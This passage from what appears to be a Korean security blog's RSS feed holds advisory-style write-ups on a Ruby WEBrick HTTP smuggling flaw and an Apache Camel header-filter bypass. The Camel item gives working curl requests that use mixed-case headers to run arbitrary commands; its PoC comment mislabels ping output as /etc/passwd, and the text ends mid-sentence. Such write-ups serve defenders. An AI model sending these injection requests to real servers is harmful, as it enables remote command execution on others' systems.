href="https://infocon.org/cons/SyScan/SyScan%202014%20Singapore/SyScan%202014%20presentations/SyScan2014_AlexIonescu_AllabouttheRPCLRPCALPCandLPCinyourPC.pdf">https://infocon.org/cons/SyScan/SyScan%202014%20Singapore/SyScan%202014%20presentations/SyScan2014_AlexIonescu_AllabouttheRPCLRPCALPCandLPCinyourPC.pdf</a></p></li><li><p><a href="https://en.wikipedia.org/wiki/Local_Inter-Process_Communication">https://en.wikipedia.org/wiki/Local_Inter-Process_Communication</a></p></li><li><p><a href="https://processhacker.sourceforge.io/doc/struct___a_l_p_c___s_e_c_u_r_i_t_y___a_t_t_r.html">https://processhacker.sourceforge.io/doc/struct___a_l_p_c___s_e_c_u_r_i_t_y___a_t_t_r.html</a></p></li><li><p><a href="https://ntdoc.m417z.com/">https://ntdoc.m417z.com/</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/IPC/">IPC</category>
      
      <category domain="https://hackyboiz.github.io/tags/gongjae/">gongjae</category>
      
      <category domain="https://hackyboiz.github.io/tags/ALPC/">ALPC</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-6442 : Ruby WEBrick의 HTTP Smuggling로 인한 Request 조작</title>
      <link>https://hackyboiz.github.io/2025/11/29/ji9umi/CVE-2025-6442/</link>
      <guid>https://hackyboiz.github.io/2025/11/29/ji9umi/CVE-2025-6442/</guid>
      <pubDate>Sat, 29 Nov 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/advisories/GHSA-r995-q44h-hr64&quot;&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/advisories/GHSA-r995-q44h-hr64">https://github.com/advisories/GHSA-r995-q44h-hr64</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>WEBrick &#x2264; 1.8.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>WEBrick&#xC740; &#xAC04;&#xD3B8;&#xD558;&#xAC8C; HTTP &#xC6F9; &#xC11C;&#xBC84;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB294; Ruby &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;. HTTP &#xBC0F; HTTPS &#xBAA8;&#xB450; &#xC9C0;&#xC6D0; &#xAC00;&#xB2A5;&#xD558;&#xBA70; Proxy, Virtual-Host &#xC11C;&#xBC84;&#xB85C; &#xD65C;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xBA87; &#xAC00;&#xC9C0; &#xC778;&#xC99D; &#xBC29;&#xC2DD; &#xB610;&#xD55C; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4; Ruby on Rails &#xBC0F; Pardino &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xAC1C;&#xBC1C; &#xC2DC; &#xD14C;&#xC2A4;&#xD2B8; &#xC11C;&#xBC84; &#xAD6C;&#xC131; &#xC2DC; &#xC790;&#xC8FC; &#xD65C;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># Source - https://stackoverflow.com/a</span><span class="hljs-comment"># Posted by pmagunia</span><span class="hljs-comment"># Retrieved 2025-11-28, License - CC BY-SA 3.0</span><span class="hljs-keyword">require</span> <span class="hljs-string">&apos;webrick&apos;</span>server = WEBrick::HTTPServer.new(<span class="hljs-symbol">:Port</span> =&gt; <span class="hljs-number">80</span>,                             <span class="hljs-symbol">:SSLEnable</span> =&gt; <span class="hljs-literal">false</span>,                             <span class="hljs-symbol">:DocumentRoot</span> =&gt; <span class="hljs-string">&apos;/var/www/myapp&apos;</span>,                             <span class="hljs-symbol">:ServerAlias</span> =&gt; <span class="hljs-string">&apos;myapp.example.com&apos;</span>)server.mount_proc <span class="hljs-string">&apos;/&apos;</span> <span class="hljs-keyword">do</span> <span class="hljs-params">|req, res|</span>  res.body = <span class="hljs-string">&apos;Hello, world!&apos;</span><span class="hljs-keyword">end</span>trap <span class="hljs-string">&apos;INT&apos;</span> <span class="hljs-keyword">do</span> server.shutdown <span class="hljs-keyword">end</span>server.start<span class="hljs-comment"># &#xC774;&#xD6C4; &#xD130;&#xBBF8;&#xB110;&#xC5D0;&#xC11C; `ruby &lt;filename&gt;.rb` &#xC2E4;&#xD589; &#xC2DC; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</span><span class="hljs-comment"># $ curl http://127.0.0.1</span><span class="hljs-comment"># Hello, world!%</span></code></pre><p>CVE-2025-6442&#xC758; &#xD0C0;&#xC784;&#xB77C;&#xC778;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li>2023.09.13 &#x2014; Vendor&#xC5D0; &#xCDE8;&#xC57D;&#xC810; &#xC81C;&#xBCF4; (&#xB2F9;&#xC2DC; ZDI-CAN-21876&#xC73C;&#xB85C; &#xC2DD;&#xBCC4;)</li><li>2024.06.26 &#x2014; WEBrick github&#xC5D0;&#xC11C; RFC 9110 &#xB0B4;&#xC6A9;&#xC744; &#xC704;&#xBC18;&#xD558;&#xB294; &#xCF54;&#xB4DC; &#xD328;&#xD134;&#xC5D0; &#xAD00;&#xD55C; &#xC774;&#xC288; &#xC0DD;&#xC131; (&#xC774;&#xC288; &#xBC88;&#xD638; <code>#137</code>)</li><li>2024.07.02 &#x2014; &#xC9C0;&#xC801;&#xB41C; &#xC0AC;&#xD56D;&#xC758; &#xD328;&#xCE58; &#xBC0F; 1.8.2 &#xBC84;&#xC804;&#xC5D0;&#xC11C; merge</li><li>2025.06.26 &#x2014; &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4; &#xACF5;&#xAC1C;</li></ul><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xACBD;&#xC6B0; <strong>&#xB300;&#xC0C1; &#xC11C;&#xBC84;&#xAC00; &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; HTTP &#xD504;&#xB85D;&#xC2DC; &#xB4A4;&#xC5D0; &#xBC30;&#xCE58;&#xB41C; &#xACBD;&#xC6B0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xAC00;&#xB2A5;</strong>&#xD558;&#xBA70; &#xBC1C;&#xC0DD; &#xC6D0;&#xC778;&#xC73C;&#xB85C;&#xB294; <strong>HTTP &#xD5E4;&#xB354;&#xC758; &#xC885;&#xB8CC; &#xBB38;&#xC790;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC77C;&#xAD00;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACB0;&#xACFC;</strong>&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5F0;&#xAD00;&#xB41C; &#xCEE4;&#xBC0B; &#xB0B4;&#xC5ED;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC8FC;&#xC694; &#xBCC0;&#xACBD;&#xC740; <em>lib/webrick/httprequest.rb</em> &#xD30C;&#xC77C;&#xACFC; <em>lib/webrick/httputils.rb</em> &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xB41C; &#xC810;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB450; &#xD30C;&#xC77C;&#xC758; &#xBCC0;&#xACBD; &#xB0B4;&#xC5ED;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><blockquote><p>lib/webrick/httprequest.rb</p></blockquote><pre><code class="hljs ruby">      @request_time = Time.now---   <span class="hljs-keyword">if</span> /^(\S+)\s+(\S++)(?<span class="hljs-symbol">:</span>\s+HTTP\/(\d+\.\d+))<span class="hljs-string">?\r</span>?\n/mo =~ @request_line+++   <span class="hljs-keyword">if</span> /^(\S+) (\S++)(?: HTTP\/(\d+\.\d+))<span class="hljs-string">?\r\n</span>/mo =~ @request_line        @request_method = $1        @unparsed_uri   = $2        @http_version   = HTTPVersion.new($3 ? $3 : <span class="hljs-string">&quot;0.9&quot;</span>)@@ -<span class="hljs-number">471</span>,<span class="hljs-number">7</span> +<span class="hljs-number">471</span>,<span class="hljs-number">7</span> @@ <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_request_line</span><span class="hljs-params">(socket)</span></span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_header</span><span class="hljs-params">(socket)</span></span>      <span class="hljs-keyword">if</span> socket        <span class="hljs-keyword">while</span> line = read_line(socket)---       <span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> /\A(<span class="hljs-comment">#{CRLF}|#{LF})\z/om =~ line</span>+++       <span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> /\A<span class="hljs-comment">#{CRLF}\z/om =~ line</span>          <span class="hljs-keyword">if</span> (@request_bytes += line.bytesize) &gt; MAX_HEADER_LENGTH            raise HTTPStatus::RequestEntityTooLarge, <span class="hljs-string">&apos;headers too large&apos;</span>          <span class="hljs-keyword">end</span></code></pre><blockquote><p>lib/webrick/httputils.rb</p></blockquote><pre><code class="hljs ruby">      field = <span class="hljs-literal">nil</span>      raw.each_line{<span class="hljs-params">|line|</span>        <span class="hljs-keyword">case</span> line---     <span class="hljs-keyword">when</span> /^([A-Za-z<span class="hljs-number">0</span>-<span class="hljs-number">9</span>!\<span class="hljs-comment">#$%&amp;&apos;*+\-.^_`|~]+):(.*?)\z/om</span>---       field, value = $1, $2.strip+++     <span class="hljs-keyword">when</span> /^([A-Za-z<span class="hljs-number">0</span>-<span class="hljs-number">9</span>!\<span class="hljs-comment">#$%&amp;&apos;*+\-.^_`|~]+):([^\r\n\0]*?)\r\n\z/om</span>+++       field, value = $1, $2          field.downcase!          header[field] = HEADER_CLASSES[field].new <span class="hljs-keyword">unless</span> header.has_key?(field)          header[field] &lt;&lt; value---     <span class="hljs-keyword">when</span> /^\s+(.*?)/om---       value = line.strip+++     <span class="hljs-keyword">when</span> /^\s+([^\r\n\<span class="hljs-number">0</span>]*?)\r\n/om          <span class="hljs-keyword">unless</span> field            raise HTTPStatus::BadRequest, <span class="hljs-string">&quot;bad header &apos;<span class="hljs-subst">#{line}</span>&apos;.&quot;</span>          <span class="hljs-keyword">end</span>+++       value = line+++       value.lstrip!+++       value.slice!(-<span class="hljs-number">2</span>..-<span class="hljs-number">1</span>)          header[field][-<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; value        <span class="hljs-keyword">else</span>          raise HTTPStatus::BadRequest, <span class="hljs-string">&quot;bad header &apos;<span class="hljs-subst">#{line}</span>&apos;.&quot;</span></code></pre><p>&#xBCC0;&#xACBD;&#xB41C; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xD06C;&#xAC8C; &#xC815;&#xADDC;&#xC2DD; &#xD328;&#xD134; &#xC218;&#xC815;&#xACFC; <code>CR</code> &#xB610;&#xB294; <code>LF</code> &#xBB38;&#xC790;&#xAC00; &#xB2E8;&#xB3C5;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB358; &#xD328;&#xD134;&#xC744; <code>CR-LF</code> &#xD615;&#xD0DC;&#xB97C; &#xAC15;&#xC81C;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xAC00; &#xC9C4;&#xD589;&#xB41C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xC0C1;&#xC801;&#xC778; &#xAD6C;&#xC870;&#xC758; HTTP &#xD328;&#xD0B7;&#xC758; &#xACBD;&#xC6B0; &#xD5E4;&#xB354; &#xC601;&#xC5ED;&#xACFC; &#xBC14;&#xB514; &#xC601;&#xC5ED;&#xC758; &#xAD6C;&#xBD84;&#xC744; &#xC704;&#xD574; <code>CR-LF</code> &#xBB38;&#xC790;&#xB97C; &#xB450; &#xBC88; &#xBC18;&#xBCF5;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xAD6C;&#xD558;&#xC9C0;&#xB9CC;, &#xAE30;&#xC874;&#xC758; &#xCF54;&#xB4DC;&#xB294; &#xC774;&#xB97C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xD558;&#xC9C0; &#xBABB;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="takeaway"><a href="#takeaway" class="headerlink" title="takeaway"></a>takeaway</h3><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810; &#xC678;&#xC5D0;&#xB3C4; &#xC790;&#xB8CC; &#xC870;&#xC0AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; WEBrick&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; HTTP Smuggling &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB2E4;&#xC218; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAC00;&#xAE09;&#xC801; &#xCD5C;&#xC2E0; &#xBCF4;&#xC548; &#xD328;&#xCE58;&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xBC84;&#xC804;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB418; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xACBD;&#xC6B0; &#xCDE8;&#xC57D;&#xD55C; &#xC124;&#xC815; &#xB4F1;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xB300;&#xC751;&#xC774; &#xD544;&#xC694;&#xD560; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>Explain<ul><li>background<ul><li><a href="https://en.wikipedia.org/wiki/WEBrick">https://en.wikipedia.org/wiki/WEBrick</a></li><li><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-414/">https://www.zerodayinitiative.com/advisories/ZDI-25-414/</a></li></ul></li><li>root cause<ul><li><a href="https://github.com/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101#diff-ad02984d873efb089aa51551bc6b7d307a53e0ba1ac439e91d69c2e58a478864">https://github.com/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101#diff-ad02984d873efb089aa51551bc6b7d307a53e0ba1ac439e91d69c2e58a478864</a></li><li><a href="https://github.com/ruby/webrick/pull/138">https://github.com/ruby/webrick/pull/138</a></li></ul></li><li>takeaway<ul><li><a href="https://hackerone.com/reports/965267">https://hackerone.com/reports/965267</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2020-25613">https://www.cve.org/CVERecord?id=CVE-2020-25613</a></li></ul></li></ul></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ji9umi/">ji9umi</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ruby/">Ruby</category>
      
      <category domain="https://hackyboiz.github.io/tags/WEBrick/">WEBrick</category>
      
      <category domain="https://hackyboiz.github.io/tags/HTTP-Sumggling/">HTTP Sumggling</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/29/ji9umi/CVE-2025-6442/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-27636 : Apache Camel의 Case-Sensitive Header Filtering Bypass로 인한 RCE</title>
      <link>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/</link>
      <guid>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/</guid>
      <pubDate>Wed, 26 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.akamai.com/blog/security-res</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.akamai.com/blog/security-research/march-apache-camel-vulnerability-detections-and-mitigations"><strong>https://www.akamai.com/blog/security-research/march-apache-camel-vulnerability-detections-and-mitigations</strong></a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><ul><li>Apache Camel 4.10.0 &#x2264; 4.10.1</li><li>Apache Camel 4.8.0 &#x2264; 4.8.4</li><li>Apache Camel 3.10.0 &#x2264; 3.22.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Apache Camel&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;, &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4; &#xAC04;&#xC758; &#xC6D0;&#xD65C;&#xD55C; &#xB370;&#xC774;&#xD130; &#xAD50;&#xD658;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xBA70; &#xAD11;&#xBC94;&#xC704;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD1B5;&#xD569; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. </p><p>Apache Camel&#xC740; DefaultHeaderFilterStrategy.java&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB0B4;&#xBD80; &#xD5E4;&#xB354;(CamelHttpResponseCode, CamelHttpUri, CamelContextId, org.apache.camel.* &#xB4F1;)&#xAC00; &#xC678;&#xBD80;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xCC28;&#xB2E8;&#xD558;&#xC5EC; &#xBBFC;&#xAC10;&#xD55C; &#xB77C;&#xC6B0;&#xD305; &#xC815;&#xBCF4; &#xB204;&#xCD9C;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a><strong>Root Cause</strong></h3><p>Apache Camel&#xC758; &#xAE30;&#xBCF8; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;&#xC740; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xB294; &#xBC29;&#xC2DD;(case-sensitive)&#xC73C;&#xB85C;&#xB9CC; &#xC815;&#xD655;&#xD55C; &#xC77C;&#xCE58;&#xB97C; &#xAC80;&#xC0AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD544;&#xD130;&#xB9C1; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">header.startsWith(<span class="hljs-string">&quot;Camel&quot;</span>) || header.startsWith(<span class="hljs-string">&quot;camel&quot;</span>) || header.startsWith(<span class="hljs-string">&quot;org.apache.camel&quot;</span>)</code></pre><p>&#xADF8;&#xB7EC;&#xB098; &#xB2E4;&#xC6B4;&#xC2A4;&#xD2B8;&#xB9BC; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xD5E4;&#xB354;&#xB4E4;&#xC774; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD5E4;&#xB354;&#xC758; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xBA74;(&#xC608;: CAmelExecCommandExecutable, cAMELHttpResponseCode), &#xD544;&#xD130;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h3><p>Akamai&#xB294; Camel&#xC758; Exec &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC0D8;&#xD50C; &#xCDE8;&#xC57D;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC81C;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; HTTP &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xB178;&#xCD9C;&#xD558;&#xACE0;, &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C;&#xB294; &#x201C;whoami&#x201D; &#xBA85;&#xB839;&#xC744; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">from(<span class="hljs-string">&quot;jetty:http://0.0.0.0:80/vulnerable&quot;</span>)    .log(<span class="hljs-string">&quot;Received request from client&quot;</span>)    <span class="hljs-comment">// define a static command. This can be overwritten using the &quot;CamelExecCommandExecutable&quot; header</span>    .to(<span class="hljs-string">&quot;exec:whoami&quot;</span>)     .convertBodyTo(String.class)     .log(<span class="hljs-string">&quot;Command Output: ${body}&quot;</span>);</code></pre><p>&#xBA85;&#xB839;&#xC774; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0;, CamelExecCommandExecutable &#xD5E4;&#xB354;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC7AC;&#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD5E4;&#xB354;&#xB294; Apache Camel <a href="https://camel.apache.org/security/">&#xACF5;&#xC2DD; &#xBB38;&#xC11C;</a>&#xC5D0; &#xBA85;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xB4EF;&#xC774; &#xC815;&#xC801; URI&#xB97C; &#xB36E;&#xC5B4;&#xC50C;&#xC6C1;&#xB2C8;&#xB2E4;. Apache Camel&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xD5E4;&#xB354;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xB300;&#xC18C;&#xBB38;&#xC790; &#xCC98;&#xB9AC; &#xC624;&#xB958;&#xB85C; &#xC778;&#xD574; &#x201C;CAmelExecCommandExecutable&#x201D; &#xD5E4;&#xB354;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xD544;&#xD130;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC815;&#xC0C1; &#xC694;&#xCCAD;</strong></p><pre><code class="hljs python">$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CamelExecCommandExecutable: ls&quot;</span>kali</code></pre><p><strong>&#xC545;&#xC758;&#xC801; &#xC694;&#xCCAD; (&#xBA85;&#xB839; &#xBCC0;&#xACBD;)</strong></p><pre><code class="hljs bash">$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandExecutable: ls&quot;</span>pom.xmlsrctarget</code></pre><p><strong>&#xC545;&#xC758;&#xC801; &#xC694;&#xCCAD; (&#xBBFC;&#xAC10; &#xC815;&#xBCF4; &#xC720;&#xCD9C;)</strong></p><pre><code class="hljs bash">*$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandExecutable: ping&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandArgs: -c 2 8.8.8.8&quot;</span>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=98.9 ms64 bytes from 8.8.8.8: icmp_seq=2 ttl=128 time=46.4 ms--- 8.8.8.8 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1012ms<span class="hljs-comment"># &#xACB0;&#xACFC;: /etc/passwd &#xD30C;&#xC77C; &#xB0B4;&#xC6A9; &#xD45C;&#xC2DC;*</span></code></pre><p><code>CAmelExecCommandExecutable</code>&#xACFC; <code>CAmelExecCommandArgs</code> &#xD5E4;&#xB354;&#xB97C; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xACFC; &#xC778;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; ping &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xACB0;&#xACFC;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC131;&#xACF5;&#xC801; &#xC545;&#xC6A9; &#xC2DC;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xBA85;&#xB839;&#xC774; Camel &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;(&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; <code>root</code>)&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>Apache&#xB294; DefaultHeaderFilterStrategy.java&#xC758; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;&#xC744; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xC5EC; <code>toLowerCase(Locale.ENGLISH)</code>&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xD5E4;&#xB354; &#xC774;&#xB984;&#xC774; &#xD544;&#xD130; &#xC801;&#xC6A9; &#xC804;&#xC5D0; &#xC18C;&#xBB38;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">java*// &#xC218;&#xC815;&#xB41C; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;*String name = header.toLowerCase(Locale.ENGLISH);<span class="hljs-keyword">if</span> (name.startsWith(<span class="hljs-string">&quot;camel&quot;</span>) || name.startsWith(<span class="hljs-string">&quot;org.apache.camel&quot;</span>)) {    <span class="hljs-keyword">return</span> true; *// &#xD544;&#xD130;&#xB9C1;&#xB428;*}</code></pre><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, CAmelHttpUri&#xB294; camelhttpuri&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xC5B4; 